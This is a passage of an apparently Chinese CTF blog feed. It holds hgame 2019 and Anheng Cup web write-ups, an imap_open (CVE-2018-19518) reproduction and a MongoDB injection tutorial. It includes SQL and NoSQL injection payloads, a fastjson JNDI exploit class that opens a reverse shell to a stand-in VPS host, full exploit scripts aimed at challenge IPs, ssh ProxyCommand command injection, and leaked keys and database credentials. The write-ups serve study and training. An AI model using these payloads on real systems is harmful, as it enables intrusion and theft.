'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'CSRF_ENABLED': True, 'SQLALCHEMY_DATABASE_URI': 'mysql+pymysql://hgame:asdkjhiou12312451r2@127.0.0.1:3306/hgame', 'SQLALCHEMY_TRACK_MODIFICATIONS': True, 'WTF_CSRF_ENABLED': True, 'WTF_CSRF_CHECK_DEFAULT': True, 'WTF_CSRF_METHODS': &#123;'PUT', 'DELETE', 'POST', 'PATCH'&#125;, 'WTF_CSRF_FIELD_NAME': 'csrf_token', 'WTF_CSRF_HEADERS': ['X-CSRFToken', 'X-CSRF-Token'], 'WTF_CSRF_TIME_LIMIT': 3600, 'WTF_CSRF_SSL_STRICT': True, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False&#125;&gt; 拿到secret_key1'SECRET_KEY': '9RxdzNwq7!nOoK3*' 接着就是伪造然后就能拿到session了1.eJwljztqQzEQAO-i2sXuSlpJvsxjv8QYEnjPrkLubkGa6QZmfsuRZ1xf5f4633Erx8PLvSTRjFoNNakTA_QchoC0fMlmGgtR8kRhI_TRhNb0QJIkWGukkjB5MC9ts4VONOBuFZJy9LU0vfbhlt1osok2ZIXk8A0pt2LXmcfr5xnfuwfFlIMcQEbSVPW05r1ip6W1br9RA-3be19x_k9g-fsAkgo_Vg.D2qpTQ.OJF7PpG3QqUlvvBoSs3wQ1wL2eM 登录进去以后getflaghgame{Qu_bu_la1_m1ng_z1_14} happy php源码放去了githubhttps://github.com/Lou00/laravel，在源码中看到在app/Http/Controllers/SessionsController.php可以看到1234567891011121314151617181920public function store(Request $request) &#123; $credentials = $this-&gt;validate($request, [ 'email' =&gt; 'required|email|max:100', 'password' =&gt; 'required' ]); if (Auth::attempt($credentials)) &#123; if (Auth::user()-&gt;id ===1)&#123; session()-&gt;flash('info','flag :******'); return redirect()-&gt;route('users.show'); &#125; $name = DB::select(\"SELECT name FROM `users` WHERE `name`='\".Auth::user()-&gt;name.\"'\"); session()-&gt;flash('info', 'hello '.$name[0]-&gt;name); return redirect()-&gt;route('users.show'); &#125; else &#123; session()-&gt;flash('danger', 'sorry,login failed'); return redirect()-&gt;back()-&gt;withInput(); &#125; &#125; 可以看到这里有个name的注入点，来个账号测试一下amdin&#39; or &#39;1&#39;=&#39;1，发现确实可以以admin的身份登录进去1234admin' union select password From `users` WHERE `id`='1' LIMIE 0,1;#'读到密码eyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ==admin' union select email FROM `users` WHERE `id`='1' LIMIT 0,1;#'读到邮箱admin@hgame.com base64解码一下密码是1&#123;\"iv\":\"rnVrqfCvfJgnvSTi9z7KLw==\",\"value\":\"EaR\\/4fldOGP1G\\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=\",\"mac\":\"56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af\"&#125; 在github的commit看到这段12345APP_NAME=LaravelAPP_ENV=localAPP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=APP_DEBUG=trueAPP_URL=http://localhost 接下来就是要想办法解密密码，我们有的信息123$hey = '9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='$iv = 'rnVrqfCvfJgnvSTi9z7KLw=='$value = 'EaR\\/4fldOGP1G\\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=' 然后是jio本12345678910import base64from Crypto.Cipher import AESdef dec(c): c = base64.b64decode(c) iv = base64.b64decode('rnVrqfCvfJgnvSTi9z7KLw==') key = AES.new(base64.b64decode('9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='), AES.MODE_CBC,iv) return key.decrypt(c)print dec('EaR\\/4fldOGP1G\\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=') 然后就获得密码9pqfPIer0Ir9UUfR，接着登录进去就行 happy java题目一开始提示说flag在hgame_flag目录下直接访问发现是404，尝试扫一下端口12345678910111213141516nmap -p0-65535 119.28.26.122#结果PORT STATE SERVICE22/tcp open ssh135/tcp filtered msrpc139/tcp filtered netbios-ssn445/tcp filtered microsoft-ds593/tcp filtered http-rpc-epmap901/tcp filtered samba-swat1025/tcp filtered NFS-or-IIS3128/tcp filtered squid-http4444/tcp filtered krb5246129/tcp filtered unknown6667/tcp filtered irc9876/tcp open sd31337/tcp open Elite 可以看到，还有一个9876端口开放，扫后台扫到一个mappings12345678910111213141516171819202122232425262728293031323334&#123; \"/webjars/**\":&#123; \"bean\":\"resourceHandlerMapping\" &#125;, \"/**\":&#123; \"bean\":\"resourceHandlerMapping\" &#125;, \"/**/favicon.ico\":&#123; \"bean\":\"faviconHandlerMapping\" &#125;, \"&#123;[/index],methods=[GET]&#125;\":&#123; \"bean\":\"requestMappingHandlerMapping\", \"method\":\"public java.lang.String me.lightless.happyjava.controller.MainController.Index()\" &#125;, \"&#123;[/you_will_never_find_this_interface],methods=[GET]&#125;\":&#123; \"bean\":\"requestMappingHandlerMapping\", \"method\":\"public java.lang.String me.lightless.happyjava.controller.MainController.YouWillNeverFindThisInterface(java.lang.String)\" &#125;, \"&#123;[/secret_flag_here],methods=[GET]&#125;\":&#123; \"bean\":\"requestMappingHandlerMapping\", \"method\":\"public java.lang.String me.lightless.happyjava.controller.MainController.SecretFlagHere(java.lang.String,javax.servlet.http.HttpServletRequest)\" &#125;, \"&#123;[/error],methods=[GET]&#125;\":&#123; \"bean\":\"requestMappingHandlerMapping\", \"method\":\"public java.lang.String me.lightless.happyjava.controller.ErrorController.ShowCommonError()\" &#125;, \"&#123;[/error],produces=[text/html]&#125;\":&#123; \"bean\":\"requestMappingHandlerMapping\", \"method\":\"public org.springframework.web.servlet.ModelAndView org.springframework.boot.autoconfigure.web.BasicErrorController.errorHtml(javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse)\" &#125;, \"&#123;[/error]&#125;\":&#123; \"bean\":\"requestMappingHandlerMapping\", \"method\":\"public org.springframework.http.ResponseEntity&lt;java.util.Map&lt;java.lang.String, java.lang.Object&gt;&gt; org.springframework.boot.autoconfigure.web.BasicErrorController.error(javax.servlet.http.HttpServletRequest)\"&#125; &#125; 访问secret_flag_here可以看到返回一个只允许本地访问的页面试了一堆改ip操作都不行，看到还有一个you_will_never_find_this_interface，访问一下看到有url，可以确定是要ssrf了，尝试一下url参数加个127.0.0.1，发现会返回eval，这里需要用dns-rebinding去绕过然后发包去intruder查看结果发现确实可以绕过他的检测，接下来就是fastjson的反序列化的利用了exp如下12345678910111213public class Exploit &#123; public Exploit()&#123; try&#123; java.lang.Runtime.getRuntime().exec( new String[]&#123;\"bash\",\"-c\",\"bash -c \\\"sh &gt;&amp; /dev/tcp/vps_ip/port 0&gt;&amp;1\\\"\"&#125;); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv)&#123; Exploit e = new Exploit(); &#125;&#125; 在vps上下载安装好marshalsec提供好ldap服务，mvn clean package -DskipTests编译好，也把Exploit.java编译好，在控制台敲出1java -cp ./target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your_ip:port/#Exploit 在一个端口起好http服务用来下载Exploit.java，然后发送下面的payload（要二次urlencode）1&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://your_ip:1389/Exploit\",\"autoCommit\":true&#125; 然后就能get到shell了 happy go简单试下网站，有登录注册上传头像和留言板这些功能，同时也泄露了源码看源码可以看见admincontroller可以看到有一个删除头像的功能12345678910111213141516171819202122232425262728293031323334func (u *UserDelController) Get() &#123; uid := u.GetSession(\"uid\") if uid == nil &#123; u.Abort(\"500\") &#125; if uid.(int) != 1 &#123; u.Redirect(\"/\", http.StatusFound) return &#125; id := u.Ctx.Input.Param(\":id\") i, _ := strconv.Atoi(id) if i == 1 &#123; u.Redirect(\"/admin\", http.StatusFound) return &#125; o := orm.NewOrm() user := models.Users&#123;Id:i&#125; err := o.Read(&amp;user) if err != nil &#123; u.Abort(\"500\") &#125; if user.Avatar != \"/static/img/avatar.jpg\" &#123; os.Remove(user.Avatar) &#125; o.QueryTable(\"messages\").Filter(\"uid\", id).Delete() o.Delete(&amp;user) u.Redirect(\"/admin\", http.StatusFound)&#125; 这里可以看到如果修改头像参数，就可以删除任意文件继续审计源码还可以看到123456789func (c *InstallController) Get() &#123; _, err := os.Stat(\"conf/app.conf\") if err != nil &amp;&amp; os.IsNotExist(err) &#123; c.TplName = \"install.tpl\" &#125; else &#123; c.Redirect(\"/\", http.StatusFound) return &#125;&#125; 可以看到install文件里面会检查有没有app.conf文件，如果没有就会重新加载所以攻击思路就是以管理员身份登录，删掉app.conf，然后install，用恶意的mysql服务器读取任意文件，而伪造管理员身份就要去看主函数了1234567func main() &#123; beego.BConfig.WebConfig.Session.SessionName = \"PHPSESSID\" beego.BConfig.WebConfig.Session.SessionProvider=\"file\" beego.BConfig.WebConfig.Session.SessionProviderConfig = \"./tmp\" beego.BConfig.WebConfig.Session.SessionOn = true beego.Run()&#125; 贴一篇其他师傅的exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788# coding:utf-8import requestsimport base64ip=\"94.191.10.201\"host=\"http://94.191.10.201:7000\"registerURL = host + \"/auth/register\"loginURL = host + \"/auth/login\"userinfoURL = host + \"/userinfo\"req = requests.session()# registerregisterData=&#123;\"username\":\"ii5am3\",\"password\":\"123456\",\"confirmpass\":\"123456\",&#125;r = req.post(registerURL,data=registerData)print(\"[+] register \"+r.text)# loginloginData=&#123;\"username\":\"ii5am3\",\"password\":\"123456\",&#125;r = req.post(loginURL,data=loginData)print(r\"[+] login \"+r.text)# 获取当前登陆用户的sessionIDsessionID = r.request._cookies._cookies[ip][\"/\"][\"PHPSESSID\"].valueprint(r\"[+] sessionID is \"+ sessionID)# 上传session，伪造cookienewSession = sessionID[0:2]+\"5am3\"filename = \"../../tmp/%s/%s/%s\" %(sessionID[0],sessionID[1],newSession)# 本地搭建环境，登入uid为1的账号，然后获取他的session的文件即可。在这里我给大家attackSession = base64.b64decode(\"Dv+BBAEC/4IAARABEAAAGv+CAAEGc3RyaW5nDAUAA3VpZANpbnQEAgAC\")sessionFiles=&#123;\"uploadname\" : (filename, attackSession)&#125;r = req.post(userinfoURL,files=sessionFiles)print(r\"[+] newCookie is: PHPSESSID=\"+ newSession)##服务端伪造脚本# coding:utf-8import requestsimport base64# req表示user1，此时全程用该一个sessionreq = requests.session()ip = \"94.191.10.201\"host = \"http://94.191.10.201:7000\"registerURL = host + \"/auth/register\"loginURL= host + \"/auth/login\"userinfoURL = host + \"/userinfo\"deleteUserURL = host +\"/admin/user/del/2\"installURl = host + \"/install\"attackCookie = base64.b64decode(\"Dv+BBAEC/4IAARABEAAAGv+CAAEGc3RyaW5nDAUAA3VpZANpbnQEAgAC\")# registerregisterData=&#123;\"username\":\"ii5am3\",\"password\":\"123456\",\"confirmpass\":\"123456\",&#125;r= req.post(registerURL,data=registerData)print(\"[+] register \"+r.text)# loginloginData=&#123;\"username\":\"ii5am3\",\"password\":\"123456\",&#125;r = req.post(loginURL,data=loginData)print(r\"[+] login \"+r.text)sessionID= r.request._cookies._cookies[ip][\"/\"][\"PHPSESSID\"].valueprint(r\"[+] sessionID is \"+ sessionID)# 上传session，伪造cookienewSession = sessionID[0:2]+\"5am3\"filename = \"../../tmp/%s/%s/%s\" %(sessionID[0],sessionID[1],newSession)sessionFiles=&#123;\"uploadname\" : (filename, attackCookie)&#125;r = req.post(userinfoURL,files=sessionFiles)print(r\"[+] newSessionID is \"+ newSession)# 修改头像文件链接。sessionFiles=&#123;\"uploadname\" : (\"../../conf/app.conf\", \"12345\")&#125;r = req.post(userinfoURL,files=sessionFiles)# 新建一个请求，伪造admin进行删除用户headers=&#123;\"Cookie\":\"PHPSESSID=\"+newSession&#125;r = requests.get(deleteUserURL,headers=headers)# 重新安装环境，将其指向我们的恶意sql服务器。installData = &#123; \"host\":\"your_ip\", \"port\":\"your_port\", \"username\":\"hgame\",\"password\":\"hgame\",\"database\":\"hgame\"&#125;r = requests.post(installURl,installData)# 再次登录，使其再来一次请求。loginData=&#123;\"username\":\"ii5am3\",\"password\":\"123456\",&#125;r = req.post(loginURL,data=loginData)print(r\"[+] login \"+r.text)","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/11/2019-hgame-week4/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019 hgame week3","date":"2019-03-05T16:00:00.000Z","path":"2019/03/06/2019-hgame-week3/","text":"神奇的md5扫到泄露拿到swp文件，恢复12345678910111213141516171819202122&lt;?phpsession_start();error_reporting(0); if (@$_POST['username'] and @$_POST['password'] and @$_POST['code']) &#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; $code = (string)$_POST['code']; if (($username == $password ) or ($username == $code) or ($password == $code)) &#123; echo \"Your input can't be the same\"; &#125; else if ((md5($username) === md5($password)) and (md5($password) === md5($code)))&#123; echo \"Good\"; header('Location: admin.php'); exit(); &#125; else &#123; echo \"&lt;pre&gt; Invalid password&lt;/pre&gt;\"; &#125; &#125;?&gt; 利用fastcoll进行md5强碰撞，通过了检验就是命令执行了cat /fla? sqli-1爆破md5然后布尔盲注12345678910111213141516171819202122232425262728293031323334353637import requestsimport hashlibdef md5(str): sha = hashlib.md5(str) e = sha.hexdigest() return eres = ''url = 'http://118.89.111.179:3000/'cookie = &#123; 'PHPSESSID':'9jgb4e4s866rpfq3ivhg75r6fq'&#125;for i in range(1000): for j in range(33,128): r = requests.get(url,cookies=cookie) md5s = r.content[35:39] # print (md5s) code = 0 for x in range(10000000): if md5(str(x))[0:4] == md5s: code = x break url2 = 'http://118.89.111.179:3000/?code=%d&amp;id=%s' # hgame # payload = \"1 and (ascii(substr((select database()),%d,1))=%d)\"%(i,j) # f1l1l1l1g,words # payload = \"1 and (ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%d,1))=%d)\"%(i,j) # f14444444g # payload = \"1 and (ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='f1l1l1l1g'),%d,1))=%d)\"%(i,j) payload = \"1 and (ascii(substr((select f14444444g from f1l1l1l1g limit 0,1),%d,1))=%d)\"%(i,j) url2 = url2%(code,payload) r = requests.get(url2,cookies=cookie) if 'welcome' in r.content: res += chr(j) print res break sqli-2基础渗透babyxss","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/06/2019-hgame-week3/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019安恒杯二月赛","date":"2019-02-28T16:00:00.000Z","path":"2019/03/01/2019安恒杯二月赛/","text":"WEBmy email这题进去首先是一个注册的页面，然后登录进去后要你完善信息，也就是填一个邮箱和验证码，这里有个小坑点就是，虽然我们乱填他会说我们填的信息有误，但是再次访问发现我们的信息已经完善了，也就能进行下一步了进去以后看到有个更改背景的功能，尝试一下改了图片发现会1234567body&#123; background-image: url(./user/roujiji.jpg); background-size: 100%,100%; width: 100%; height: 100%;&#125;#roujiji是注册的用户名 所以可以猜测是将图片命名成用户名.jpg，尝试一下注册一个roujiji.php%00的账号，发现会被转义成roujiji.php\\00所以直接改用户名通过图片getshell是不行的了继续往下看，可以看到所以后台是有imap的，谷歌一下找到imap_open()有个漏洞（cve-2018-19518），对着肝一波触发了waf，测试一下发现过滤了base64 | \\，所以直接利用是不行的了，还是不能进行任意文件写入继续思考发现，因此知道文件路径，那么可以先上传一个文件，然后在文件里面写入任意代码，最后再在邮箱验证时触发它，最终exp然后菜刀连过去就行了","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/01/2019安恒杯二月赛/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"安恒杯","slug":"安恒杯","permalink":"https://xi4or0uji.github.io/tags/安恒杯/"}]},{"title":"imap_open()实现远程任意代码执行（CVE-2018-19518）","date":"2019-02-28T16:00:00.000Z","path":"2019/03/01/imap_open()实现远程任意代码执行（CVE-2018-19518）/","text":"这个漏洞是在做题的时候看到的，顺便复现一下，漏洞影响版本有ubuntu、debian、redhat和suse 简单介绍这个漏洞因为imap_open函数在传递邮箱名给ssh之前没有正确过滤邮箱名，导致攻击者可以利用-oProxyCommand参数向IMAP服务器发起命令执行恶意代码 复现装环境1apt updata &amp;&amp; apt install -y nano php php-imap 接着安装ssh和strace12apt install -y sshapt install -y strace 接着加一点安全配置，增加php的安全性123echo ‘; priority=99’ &gt; /etc/php/7.0/mods-available/disablefns.iniecho ‘disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source’ &gt;&gt; /etc/php/7.0/mods-available/disablefns.iniphpenmod disablefns imap顺便了解一下imap，imap其实就是一个管理电子邮件的东西，允许多个电子邮件客户端对电子邮件收件箱进行完全的管理调用语法1imap_open($mailbox, $username, $password [, $option = 0 [, $n_retries = 0 [, $params = []]]]); 如果要自定义连接的服务器使用的mailbox参数定义如下1&#123;[host]&#125;:[port][flags]&#125;[mailbox_name] 示例1imap_open(“&#123;mail.domain.com&#125;:143/imap/notls&#125;”, “user”, “passwd”) rshrsh直到现在依旧使用，我们可以看一下下面这张图 漏洞细节查看imap2007库的源码可以看到有个tcp_aopen函数/imap-2007f/src/osdep/unix/tcp_unix.c1234TCPSTREAM *tcp_aopen (NETMBX *mb,char *service,char *usrbuf)&#123; ......&#125; 接着检查ssh和rsh路径的定义/imap-2007f/src/osdep/unix/tcp_unix.c123456#ifdef SSHPATH /* ssh path defined yet? */ if (!sshpath) sshpath = cpystr (SSHPATH);#endif#ifdef RSHPATH /* rsh path defined yet? */ if (!rshpath) rshpath = cpystr (RSHPATH);#endif 可以看到，如果sshpath没有被定义，那就会定义rshpath，接下来我们去找sshpath的定义先看h文件的默认路径/imap-2007f/src/osdep/unix/env_unix.h1#define SYSCONFIG \"/etc/c-client.cf\" /imap-2007f/src/osdep/unix/env_unix.c12345void dorc (char *file,long flag)&#123; ...... else if (!compare_cstring (s,\"set ssh-path\")) mail_parameters (NIL,SET_SSHPATH,(void *) k); 可以看到默认情况下它是空的，但是我们也没有权限去修改，因为是etc文件，既然etc文件不可写，那我们可以考虑一下rshpath能不能改我们控制/imap-2007f/src/osdep/unix/Makefile12slx: # Secure LinuxRSHPATH=/usr/bin/rsh \\ 最后是执行情况/imap-2007f/src/osdep/unix/tcp_unix.c123456789101112if (*service == '*') &#123; /* want ssh? */ /* return immediately if ssh disabled */ if (!(sshpath &amp;&amp; (ti = sshtimeout))) return NIL; /* ssh command prototype defined yet? */ if (!sshcommand) sshcommand = cpystr (\"%s %s -l %s exec /etc/r%sd\"); &#125; /* want rsh? */ else if (rshpath &amp;&amp; (ti = rshtimeout)) &#123; /* rsh command prototype defined yet? */ if (!rshcommand) rshcommand = cpystr (\"%s %s -l %s exec /etc/r%sd\"); &#125; else return NIL; /* rsh disabled */ 可以看到他会生成一个在远程服务器上执行rimapd文件二进制的命令尝试一下测试一下test1.php1imap_open('&#123;localhost&#125;:143/imap&#125;INBOX', '', ''); 然后利用strace工具去观察脚本的执行过程（这里肉鸡环境imap开不起来，只能借大佬的图一用了通过execve过程可以看到localhost也作为了执行参数，因此尝试在操作服务器地址的同时加入命令行在ssh文件中，有-o这样的选项，通过这一个选项，我们就可以在命令行中加入任意指令了具体利用方向如下123$ubuntu: ssh -oProxyCommand=”echo hello|tee /tmp/executed” localhost$ubuntu: cat /tmp/executed$ hello 这样子确实可以进行命令执行，但是写在服务器地址的时候，空格和斜杠都会被转义掉，因此要用$IFS和\\t去绕过1ssh -oProxyCommand=”echo hello|tee (\\t这里是tab符) /tmp/executed” localhost 当然也可以利用base64编码，同样也是能进行命令执行的1234#先对命令行进行base64编码$ubuntu: echo “echo hello|tee /tmp/executed”|base64#得到编码后的命令ZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVjdXRlZAo=就能进行利用了$ubuntu: ssh -oProxyCommand=”echo ZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVjdXRlZAo=|ba se64 -d|bash” localhost 完整调用过程test2.php1234$payload = “echo hello|tee /tmp/executed”;$encoded_payload = ba se64_encode($payload);$server = “any -o ProxyCommand=echo\\t”.$encoded_payload.”|ba se64\\t-d|bash”;@imap_open(‘&#123;‘.$server.’&#125;:143/imap&#125;INBOX’, ‘’, ‘’); 将我们上面做的过程直接写进一个php文件观察他的调用过程通过strace的追踪，我们最终发现我们注入的命令都是由系统库去执行的，这谁拦得住啊…….. 参考https://lab.wallarm.com/rce-in-php-or-how-to-bypass-disable-functions-in-php-installations-6ccdbf4f52bb","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/01/imap_open()实现远程任意代码执行（CVE-2018-19518）/","categories":[{"name":"CVE","slug":"CVE","permalink":"https://xi4or0uji.github.io/categories/CVE/"}],"tags":[{"name":"cve","slug":"cve","permalink":"https://xi4or0uji.github.io/tags/cve/"}]},{"title":"MongoDB注入","date":"2019-02-26T16:00:00.000Z","path":"2019/02/27/MongoDB注入/","text":"之前做比赛题经常会遇到mongodb注入，每次都一知半解一脸懵逼，总结一下 MongoDB概括记下增删改查（php5） 直接调用类方法1234567$mongodb = new mongoclient(); //建立连接$db = $mongodb-&gt;myinfo; //选择数据库$coll = $db-&gt;test; //选择集合$coll-&gt;save(); //增$coll-&gt;find(); //查$coll-&gt;remove(); //减$coll-&gt;update(); //改 execute方法1234567$monggdb = new mongoclient(); //建立连接$db = $monggdb-&gt;myinfo; //选择数据库$query = \"db.table.save(&#123;'newsid':1&#125;)\"; //增$query = \"db.table.find(&#123;'newsid':1&#125;)\"; //查$query = \"db.table.remove(&#123;'newsid':1&#125;)\"; //删$query = \"db.table.update(&#123;'newsid':1&#125;,&#123;'newsid',2&#125;)\"; //改$result = $db-&gt;execute($query); //执行 在php7中的利用会很麻烦，很多函数都不一样了，还有很多坑，所以还是建议php5写php7123$mongo = new MongoDB\\Driver\\Manager();$result = $mongo-&gt;executeQuery('db.collection', new MongoDB\\Driver\\Query(['uid'=&gt;$id], []), new MongoDB\\Driver\\ReadPreference(MongoDB\\Driver\\ReadPreference::RP_PRIMARY_PREFERRED));// 返回的$result是一个对象，需要手动转换成数组。 攻击基本操作在学习注入之前，先要学一下MongoDB的逻辑操作符12345678910gt 大于 &#123;\"field\": &#123;$gt: value&#125;&#125;lt 小于 &#123;\"field\": &#123;$lt: value&#125;&#125;gte 大于等于 &#123;\"field\": &#123;$gte: value&#125;&#125;lte 小于等于 &#123;\"filed\": &#123;$lte: value&#125;&#125;ne 不等于 &#123;\"member.age\": &#123;$ne: \"nine\"&#125;&#125;exists 是否存在 &#123;\"array.0\" &#123;$exists: 1&#125;&#125; #数组中是否存在第一条数据or 或者 &#123;\"$or\": [&#123;\"member.age\": \"3\"&#125;,&#123;\"member.name\": \"h4ck3r\"&#125;]&#125;and 并且 &#123;\"$and\": [&#123;\"member.age\": \"3\"&#125;,&#123;\"member.name\": \"h4ck3r\"&#125;]&#125;regex 正则 (&#123;\"name\": &#123;\"$regex\": \"^a$\"&#125;&#125;)size 个数 (&#123;\"name\": &#123;\"$size\": 3&#125;&#125;) #$size name元素个数为3 数组绑定时注入$ne注入先去扒一个脚本12345678910111213141516171819202122&lt;?php$mongo = new mongoclient(\"mongodb://127.0.0.1\");$db = $mongo-&gt;myinfo; //选择数据库$coll = $db-&gt;test; //选择集合$username = $_GET['username'];$password = $_GET['password'];$data = array( 'username'=&gt;$username, 'password'=&gt;$password );$data = $coll-&gt;find($data);$count = $data-&gt;count();if ($count&gt;0) &#123; foreach ($data as $user) &#123; echo 'username:'.$user['username'].\"&lt;/br&gt;\"; echo 'password:'.$user['password'].\"&lt;/br&gt;\"; &#125;&#125;else&#123; echo '未找到';&#125;?&gt; 可以看到，这个脚本会将输入的username和password扔去数据库找，如果有，就全部显示出来正常我们查询是1username=xiaorouji&amp;password=123456 这个时候后台的查询语句是1db.test.find(&#123;username:'xiaorouji',password:'123456'&#125;) 但是，如果我们输入的语句是1username[$ne]=xiaorouji&amp;password[$ne]=123456 这样子，后台语句就会变成1db.test.find(&#123;username:&#123;'$ne':'xiaorouji'&#125;,password:&#123;'$ne':'123456'&#125;&#125;) 这样就能获得后台除了xiaorouji这个账号的其他全部账号的信息了 $regex注入正则注入跟布尔盲注差不多，也是当页面只返回true或者false的时候，让他去一个个匹配，最终拿到值给一题hctf的题目，后台大致代码如下1234567891011121314151617181920212223&lt;?php$mongo = new mongoclient();$db = $mongo-&gt;myinfo; //选择数据库$coll = $db-&gt;test; //选择集合$lock = $_POST['lock'];$key = $_POST['key'];if (is_array($lock)) &#123; $data = array( 'lock'=&gt;$lock); $data = $coll-&gt;find($data); if ($data-&gt;count()&gt;0) &#123; echo 'the lock is right,but wrong key'; &#125;else&#123; echo 'lock is wrong'; &#125;&#125;else&#123; if ($lock == 'xxxxxxxx'&amp;&amp;$key=='xxxxxxxxx') &#123; echo 'Your flag is xxxxxxx'; &#125;else&#123; echo 'lock is wrong'; &#125;&#125;?&gt; 可以看到只有正确和错误的两种回显，payload如下1234567891011121314151617181920&lt;?php $ch=curl_init();curl_setopt($ch,CURLOPT_URL,'http://121.40.86.166:23339/');curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_POST,1);$ori = '0123456789abcdefghijklmnopqrstuvwxyz';$str = '';for ($i=0; $i &lt;10 ; $i++) &#123; for ($j=0; $j &lt;strlen($ori) ; $j++) &#123; $post = 'key=1&amp;lock[$regex]=^'.$str.$ori[$j]; curl_setopt($ch,CURLOPT_POSTFIELDS,$post); $data=curl_exec($ch); if (strlen($data) == 319) &#123; $str.=$ori[$j]; echo $str.\"\\r\\n\"; break; &#125; &#125;&#125;?&gt; 在数据库中的执行语句是1db.test.find(&#123;lock:&#123;'$regex':'^a'&#125;&#125;); 拼接字符串注入这种注入跟sql里面最基本的回显注入类似，举个栗子1234567891011121314151617181920&lt;?php$username = $_GET['username'];$password = $_GET['password'];$query = \"var data = db.test.findOne(&#123;username:'$username',password:'$password'&#125;);return data;\";//$query = \"return db.test.findOne();\";//echo $query;$mongo = new mongoclient();$db = $mongo-&gt;myinfo;$data = $db-&gt;execute($query);if ($data['ok'] == 1) &#123; if ($data['retval']!=NULL) &#123; echo 'username:'.$data['retval']['username'].\"&lt;/br&gt;\"; echo 'password:'.$data['retval']['password'].\"&lt;/br&gt;\"; &#125;else&#123; echo '未找到'; &#125;&#125;else&#123; echo $data['errmsg'];&#125;?&gt; 首先我们先尝试一下1username=123'&amp;password=123 这样我们首先会收到报错，因为单引号没有闭合，接下来尝试一个闭合语句这里有个坑点就是高版本的MongoDB好像不支持注释符，所以直接拿注释符注释后面实际上是不行的1username=test'&#125;);return (&#123;username:1,password:2&#125;);var foo = (&#123;'foo':'&amp;password=123 这样子后台还是可以返回一个数据，也就刚好能绕过前面的限制，获得特定的信息爆mongodb版本1username=test'&#125;);return (&#123;username:version(),password:2&#125;);var foo = (&#123;'foo':' 爆当前数据库1username=test'&#125;); return (&#123;username:toJson(db),password:2&#125;);var foo = (&#123;'foo':' 爆所有表1username=test'&#125;); return (&#123;username:toJson(db.getCollectionNames()),password:2&#125;); var foo = (&#123;'1&amp;password=123 查看文档db.collection.find()这个函数在无参的时候会返回集合中的所有文档以及里面的所有字段123username=test'&#125;); return (&#123;username:toJson(db.test.find()),password:2&#125;); (&#123;foo:'123&amp;password=123#查看单条信息username=test'&#125;); return (&#123;username:toJson(db.test.find()[1]),password:2&#125;); (&#123;foo:'123&amp;password=123 当然这中间还可以有更多的语句操作，不一一列举了 时间盲注跟sql的时间盲注原理相似，放个payload1username=test'&#125;); if (db.version()&gt;\"0\")&#123;sleep(10000);exit;&#125; var b=(&#123;a:'1&amp;password=123 这样就能成功延时了 